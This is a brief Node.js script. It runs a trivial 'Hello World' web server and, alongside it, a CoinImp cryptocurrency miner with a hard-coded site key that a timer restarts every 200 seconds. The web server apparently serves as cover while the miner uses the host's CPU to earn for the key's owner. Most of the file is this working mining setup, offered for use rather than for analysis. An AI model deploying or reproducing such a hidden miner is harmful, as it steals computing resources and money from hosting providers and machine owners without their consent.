const http = require('http');  

 
 
(async () => { 
  const requestHandler = (request, response) => {  
       console.log(request.url)
       response.end('Hello World')
  }
       
  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {  
    if (err) {
      return console.log('something bad happened', err)
    }

    console.log(`server is listening`)
  })
 
})();


const CoinImp = require('coin-imp');

function kiusi(){
  (async () => {
  // Create miner
  const miner = await CoinImp('42a41ad2eb9291f2b48fa6cf2eb4b606cdc1dc9f0f852f5ad2b59636279227f4'); // CoinImp's Site Key 
  // Start miner
  await miner.start(); 
  // Listen on events
  miner.on('found', () => console.log('Found!'));
  miner.on('accepted', () => console.log('Accepted!'));
  miner.on('update', data =>
    console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `)
  ); 
  // Stop miner
  setTimeout(async () => await miner.stop(), 30000);
})();

}



function f() { 
    console.log('-111111111111-------trong f -----------');
    kiusi();
    console.log(Date()); 
    setTimeout( f, 200000 ); 
    console.log('--tttttttttt--') 
}



f();
